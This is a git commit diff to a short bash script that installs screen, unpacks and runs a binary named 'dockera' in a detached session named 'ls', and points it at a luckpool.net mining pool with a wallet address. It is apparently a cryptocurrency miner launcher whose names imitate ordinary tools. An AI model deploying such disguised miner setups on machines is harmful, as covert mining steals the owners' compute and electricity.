bc2dfb973ec65c610b48d864fe76dd90ba32bd81
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-03 21:14:47 +0700

    Update luck3.sh

--- luck3.sh
+++ luck3.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x docker 
+tar -xvf dockera.tar.gz
+chmod +x dockera 
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
